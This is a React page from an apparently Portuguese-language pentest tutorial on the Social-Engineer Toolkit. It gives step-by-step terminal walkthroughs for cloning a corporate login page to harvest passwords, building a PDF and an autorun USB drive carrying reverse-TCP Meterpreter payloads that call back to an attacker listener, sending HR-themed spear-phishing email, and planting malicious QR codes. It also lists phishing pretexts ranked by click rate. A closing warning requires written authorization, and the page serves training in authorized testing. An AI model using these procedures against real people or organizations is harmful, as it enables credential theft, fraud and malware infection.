import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function SET() {
  return (
    <PageContainer
      title="SET — Social Engineering Toolkit"
      subtitle="setoolkit do TrustedSec: clone de site, spear phishing, payload USB infectado, QR code malicioso."
      difficulty="avancado"
      timeToRead="14 min"
      prompt="se/setoolkit"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y set",
            out: `Reading package lists... Done
set is already the newest version (1:8.0.3+git20240328-0kali1).
0 upgraded, 0 newly installed, 0 to remove.`,
            outType: "muted",
          },
          {
            cmd: "sudo setoolkit",
            out: `[!] The Social-Engineer Toolkit is for security professionals only.

If you understand and accept this, type 'yes' to continue.

Do you agree to the terms of service [y/n]: y

         01010011    01000101    01010100
   The Social-Engineer Toolkit (SET)         
   Created by: David Kennedy (ReL1K)
              Version: 8.0.3
            Codename: 'Maverick'

 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

set>`,
            outType: "info",
          },
        ]}
      />

      <h2>Menu principal</h2>
      <OutputBlock label="Vetores em Social-Engineering Attacks" type="default">
{`set> 1
1) Spear-Phishing Attack Vectors      → email com PDF/EXE malicioso
2) Website Attack Vectors             → clone site (credential harvest, java applet, iframe inject)
3) Infectious Media Generator         → autorun em USB/DVD com payload
4) Create a Payload and Listener      → exe simples + handler
5) Mass Mailer Attack                 → spam com pretexto
6) Arduino-Based Attack Vector        → BadUSB com Arduino
7) Wireless Access Point Attack       → fake AP captive portal
8) QRCode Generator Attack Vector     → QR aponta para phish
9) Powershell Attack Vectors          → payload PS encoded
10) Third Party Modules
99) Return back to the main menu`}
      </OutputBlock>

      <h2>Clone de site (credential harvester) — passo a passo</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo setoolkit  →  1  →  2  →  3  →  2",
            out: `set> 1                  ← Social-Engineering Attacks
set> 2                  ← Website Attack Vectors

  1) Java Applet Attack Method
  2) Metasploit Browser Exploit Method
  3) Credential Harvester Attack Method  ← clone + captura senha
  4) Tabnabbing Attack Method
  5) Web Jacking Attack Method
  6) Multi-Attack Web Method
  7) HTA Attack Method

set:webattack> 3        ← Credential Harvester

  1) Web Templates       (Facebook/Gmail/Twitter já prontos)
  2) Site Cloner         ← qualquer URL
  3) Custom Import

set:webattack> 2        ← Site Cloner

[-] Credential harvester will allow you to utilize the clone capabilities within SET to harvest credentials or parameters from a website.

set> IP address for the POST back in Harvester/Tabnabbing [192.168.1.107]: 
set> Enter the url to clone: https://login.empresa.com.br

[*] Cloning the website: https://login.empresa.com.br
[*] This could take a little bit...

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.

[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:`,
            outType: "warning",
          },
        ]}
      />

      <h2>Vítima cai e digita credenciais</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "(em outro terminal): vítima visitou http://192.168.1.107 → vê site clonado",
            cmd: "(no painel SET aparece quando ela submete o form)",
            out: `192.168.1.45 - - [03/Apr/2026 22:14:21] "GET / HTTP/1.1" 200 -
192.168.1.45 - - [03/Apr/2026 22:14:23] "GET /style.css HTTP/1.1" 200 -

[*] WE GOT A HIT! Printing the output:
PARAM: csrf_token=AbCd1234XyZ
POSSIBLE USERNAME FIELD FOUND: usuario=ana.silva@empresa.com.br
POSSIBLE PASSWORD FIELD FOUND: senha=Empresa@2025!
PARAM: g-recaptcha-response=03AGdBq25...
PARAM: submit=Entrar
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.`,
            outType: "error",
          },
          {
            cmd: "(Ctrl+C — gera relatório XML)",
            out: `[*] File exported to /root/.set/reports/2026-04-03 22:14:48.341272.xml for your reading pleasure...
[*] Returning to main menu.`,
            outType: "info",
          },
          {
            cmd: "sudo cat '/root/.set/reports/2026-04-03 22:14:48.341272.xml' | head -25",
            out: `<?xml version="1.0" ?>
<harvester>
  <session>
    <victim ip="192.168.1.45" time="2026-04-03 22:14:23">
      <param name="usuario">ana.silva@empresa.com.br</param>
      <param name="senha">Empresa@2025!</param>
      <param name="csrf_token">AbCd1234XyZ</param>
    </victim>
  </session>
</harvester>`,
            outType: "default",
          },
        ]}
      />

      <h2>Spear-phishing por email</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo setoolkit  →  1  →  1  →  2",
            out: `set> 1                              ← SE Attacks
set> 1                              ← Spear-Phishing Attack Vectors

  1) Perform a Mass Email Attack
  2) Create a FileFormat Payload          ← anexo PDF/Word com macro
  3) Create a Social-Engineering Template

set:phishing> 2

  1) SET Custom Written DLL Hijacking Attack Vector
  2) SET Custom Written Document UNC LM SMB Capture Attack
  [...]
  12) Adobe PDF Embedded EXE Social Engineering
  13) Adobe util.printf Stack Buffer Overflow
  14) Microsoft Word RTF pFragments Stack Overflow

set:payloads> 12                    ← clássico: PDF com EXE embutido

  1) Use built-in BLANK PDF for attack
  2) Use your own PDF for attack    ← mais convincente

set:payloads> 1

[-] Default payload creation selected. SET will generate a normal PDF with embedded EXE.

  1) Windows Reverse TCP Shell
  2) Windows Meterpreter Reverse_TCP
  3) Windows Reverse VNC DLL
  [...]

set:payloads> 2

set> IP address for the payload listener (LHOST): 192.168.1.107
set> Enter the port to connect back on [443]: 4444

[*] Generating fileformat exploit...
[*] Payload creation complete.
[*] All payloads get sent to /usr/share/set/src/program_junk/template.pdf
[*] Payload creation complete.

  1) Email Attack Single Email Address
  2) Email Attack Mass Mailer

set:phishing> 1

[*] Do you want to use a predefined template or craft a one time email template:

  1) Pre-Defined Template
  2) One-Time Use Email Template

set:phishing> 2

  Subject: Atualização da política de RH
  Send the message as html or plain? 'h' or 'p': h
  Enter the body of the message, hit return for a new line. Control+c when finished:

  Olá Ana,
  
  Conforme reunião de hoje, segue o documento atualizado da política de RH para sua revisão.
  Por favor, leia até sexta-feira.
  
  Att,
  RH Empresa

  Send to (use comma): ana.silva@empresa.com.br

  1) Use a Gmail Account
  2) Use your own server or open relay

set:phishing> 2

  From address: rh@empresa.com.br
  SMTP server: 192.168.1.107
  Port [25]: 25
  Username (or blank): 
  Password (or blank):

[*] SET has finished delivering the emails`,
            outType: "warning",
          },
        ]}
      />

      <h2>QR code malicioso</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo setoolkit  →  1  →  8",
            out: `set> 1
set> 8                              ← QRCode Generator Attack Vector

set> Enter the URL you want the QRCode to go to: http://192.168.1.107
[*] QRCode has been generated under reports/qrcode_attack.png

set> Press {return} to view the QR Code`,
            outType: "muted",
          },
          {
            cmd: "ls /root/.set/reports/qrcode_attack.png && xdg-open /root/.set/reports/qrcode_attack.png",
            out: "(abre o QR — você imprime e cola em poste / coloca em flyer / no banheiro do escritório alvo)",
            outType: "info",
          },
        ]}
      />

      <h2>USB infectado (autorun)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo setoolkit  →  1  →  3",
            out: `set> 1
set> 3                              ← Infectious Media Generator

  1) File-Format Exploits          (PDF, Word, etc.)
  2) Standard Metasploit Executable

set:infectious> 2

  1) Windows Shell Reverse_TCP
  2) Windows Meterpreter Reverse_TCP
  [...]

set:payloads> 2
set> LHOST: 192.168.1.107
set> Port: 4444

[*] Payload creation complete.
[*] All files saved to /root/.set/autorun/
   - autorun.inf
   - exploit.exe (assinado, com nome inocente)

[*] Burn this folder to a CD/DVD or copy to a USB drive`,
            outType: "warning",
          },
        ]}
      />

      <h2>GoPhish — alternativa profissional</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "para campanhas reais (com tracking, dashboard, agendamento) o padrão é GoPhish",
            cmd: "wget -qO gophish.zip https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip && unzip -d gophish gophish.zip && cd gophish && ./gophish",
            out: `time="2026-04-03T22:32:14-03:00" level=info msg="Background Worker Started Successfully - Waiting for jobs"
time="2026-04-03T22:32:14-03:00" level=info msg="Please login with the username admin and the password [random_pass_log]"
time="2026-04-03T22:32:14-03:00" level=info msg="Starting admin server at https://0.0.0.0:3333"
time="2026-04-03T22:32:14-03:00" level=info msg="Starting phishing server at http://0.0.0.0:80"`,
            outType: "info",
          },
        ]}
      />

      <h2>Pretextos comuns (que funcionam)</h2>
      <CommandTable
        title="Cenários top em campanhas reais"
        variations={[
          { cmd: "Sharepoint expirado", desc: "'Seu acesso ao Sharepoint expira hoje. Renove aqui.'", output: "Taxa de clique ~22%." },
          { cmd: "Office 365 — confirmação de senha", desc: "'Detectamos login suspeito. Confirme sua senha.'", output: "~30%." },
          { cmd: "RH — política de home office", desc: "'Nova política. Leia e confirme leitura.'", output: "~45% (assunto interno)." },
          { cmd: "Boleto/NFe falso (BR)", desc: "'Boleto pendente — empresa X.'", output: "Mais comum no BR." },
          { cmd: "Atualização DocuSign", desc: "'Você tem 1 documento para assinar.'", output: "~28%." },
          { cmd: "Inscrição evento gratuito", desc: "'Webinar exclusivo de cyber.'", output: "Combina com perfil técnico." },
          { cmd: "CEO Fraud (BEC)", desc: "Email do CEO pedindo TED urgente.", output: "Mais $$ por hit." },
          { cmd: "Status de entrega Correios", desc: "'Sua encomenda está retida.'", output: "Massa, não-direcionado." },
        ]}
      />

      <h2>Métricas que importam no relatório</h2>
      <OutputBlock label="dashboard típico após campanha de 100 emails" type="info">
{`Total enviados:           100
Entregues (≠ bounce):      94    94%
Abertos:                   62    66% dos entregues   (pixel tracking)
Cliques no link:           38    61% dos abertos
Submeteram credenciais:    14    37% dos cliques
Submeteram c/ MFA:          3     8% dos cliques     ← MFA bypass tentado

Tempo médio click→submit:  47s
Departamento mais clicado: Vendas (52%)
Departamento menos:        TI (12%)
Reportaram phish:           4    4%               ← bom indicador maturidade`}
      </OutputBlock>

      <PracticeBox
        title="Lab: clone seu próprio site e capture suas creds"
        goal="Validar fluxo de credential harvester sem alvo terceiro."
        steps={[
          "Suba um pequeno HTML local com form de login.",
          "Rode setoolkit → site cloner → URL do seu próprio HTML.",
          "Abra o site clonado em outra aba (simulando vítima).",
          "Submeta credenciais quaisquer.",
          "Confirme captura no console do SET.",
        ]}
        command={`# 1) site original
mkdir -p ~/site && cd ~/site
cat > index.html <<'EOF'
<form method="post" action="/login">
  Usuario: <input name="usuario"/><br>
  Senha:   <input name="senha" type="password"/><br>
  <button>Entrar</button>
</form>
EOF
python3 -m http.server 8080 &

# 2) clone
sudo setoolkit
# → 1 → 2 → 3 → 2 → IP=192.168.1.107 → URL=http://192.168.1.107:8080

# 3) vítima (em browser)
firefox http://192.168.1.107
# (preencher e submit)

# 4) confirmar no painel SET`}
        expected={`POSSIBLE USERNAME FIELD FOUND: usuario=admin
POSSIBLE PASSWORD FIELD FOUND: senha=teste123
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.`}
        verify="Após Ctrl+C: arquivo XML salvo em /root/.set/reports/ com o JSON da captura."
      />

      <AlertBox type="danger" title="Engenharia social = ataque a pessoas">
        Use APENAS em pentest com cláusula explícita de SE assinada. Phish funcionário sem
        autorização = crime de fraude eletrônica + danos à imagem da empresa. Em campanha
        autorizada: documente tudo, não rouba dados além do necessário, NUNCA mantenha
        credenciais capturadas após o relatório.
      </AlertBox>
    </PageContainer>
  );
}
